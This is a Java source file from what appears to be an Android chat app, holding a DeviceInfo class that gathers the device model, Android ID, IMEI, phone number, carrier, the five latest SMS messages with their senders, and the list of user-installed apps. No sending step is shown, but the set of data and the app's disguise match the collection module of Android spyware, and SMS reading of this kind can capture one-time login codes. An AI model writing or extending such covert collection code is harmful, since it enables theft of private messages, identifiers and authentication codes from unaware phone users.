package chat.meetin.app;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class DeviceInfo {
    /**
     * Returns a stable app-scoped device identifier without using Build.SERIAL.
     * Build.SERIAL and Build.getSerial() can throw on modern Android and on OEM builds.
     */
    public static String getDeviceId(Context ctx) {
        String model = Build.MODEL == null ? "unknown" : Build.MODEL.replace(" ", "_");
        String androidId = "unknown";
        try {
            String value = Settings.Secure.getString(
                    ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (value != null && !value.isEmpty()) {
                androidId = value;
            }
        } catch (Exception ignored) {
            // Keep the non-identifying fallback so service startup cannot fail.
        }
        return model + "|" + androidId;
    }

    public static String getFullInfo(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            StringBuilder sb = new StringBuilder();

            sb.append("DEVICE INFO\n");
            sb.append("Model: ").append(Build.MODEL).append("\n");
            sb.append("Brand: ").append(Build.BRAND).append("\n");
            sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
            sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
            sb.append("Device ID: ").append(getDeviceId(ctx)).append("\n");

            appendPhoneInfo(ctx, tm, sb);
            return sb.toString();
        } catch (Exception e) {
            return "Device Info Error: " + e.getMessage();
        }
    }

    @SuppressLint("MissingPermission")
    private static void appendPhoneInfo(Context ctx, TelephonyManager tm, StringBuilder sb) {
        if (tm == null) {
            return;
        }
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sb.append("\nPhone Info: Permission Denied\n");
                return;
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                sb.append("\nIMEI: ").append(tm.getImei()).append("\n");
            } else {
                sb.append("\nIMEI: ").append(tm.getDeviceId()).append("\n");
            }
            sb.append("Phone Number: ").append(tm.getLine1Number()).append("\n");
            sb.append("Network: ").append(tm.getNetworkOperatorName()).append("\n");
        } catch (SecurityException e) {
            sb.append("\nPhone Info: Permission Denied\n");
        } catch (Exception ignored) {
            // Telephony identifiers are optional and vary by device/OEM.
        }
    }

    public static String readSms(Context ctx) {
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {"address", "body"};
            try (Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 5")) {
                if (cursor == null) return "No SMS access";

                int addressIndex = cursor.getColumnIndex("address");
                int bodyIndex = cursor.getColumnIndex("body");
                if (addressIndex < 0 || bodyIndex < 0) return "SMS columns unavailable";

                StringBuilder sb = new StringBuilder("SMS:\n");
                while (cursor.moveToNext()) {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);
                    if (address != null && body != null) {
                        sb.append(address).append(": ").append(body).append("\n");
                    }
                }
                return sb.toString();
            }
        } catch (SecurityException e) {
            return "SMS permission denied";
        } catch (Exception e) {
            return "SMS error: " + e.getMessage();
        }
    }

    public static String getUserApps(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            List<String> userApps = new ArrayList<>();
            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    try {
                        String label = pm.getApplicationLabel(app).toString();
                        if (label != null && !label.isEmpty()) {
                            userApps.add(label);
                        }
                    } catch (Exception ignored) {}
                }
            }
            StringBuilder sb = new StringBuilder("User Apps (" + userApps.size() + "):\n");
            for (String app : userApps) {
                sb.append("- ").append(app).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "Apps error: " + e.getMessage();
        }
    }
}
